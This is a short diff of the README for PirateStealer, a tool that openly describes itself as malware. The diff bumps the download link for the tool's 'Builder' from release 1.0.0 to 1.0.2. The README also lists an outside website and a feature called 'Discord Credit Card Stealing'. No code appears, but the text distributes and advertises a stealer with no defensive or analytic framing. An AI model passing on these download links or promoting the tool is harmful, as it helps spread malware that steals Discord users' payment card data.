@@ -7,7 +7,7 @@ Official PirateStealer repos
 # Other Websites
 - https://monster.casa
 
-# [Builder](https://github.com/Stanley-GF/PirateStealer/releases/download/1.0.0/Builder.zip)
+# [Builder](https://github.com/Stanley-GF/PirateStealer/releases/download/1.0.2/Builder.zip)
 
 # Features
 - Discord Credit Card Stealing
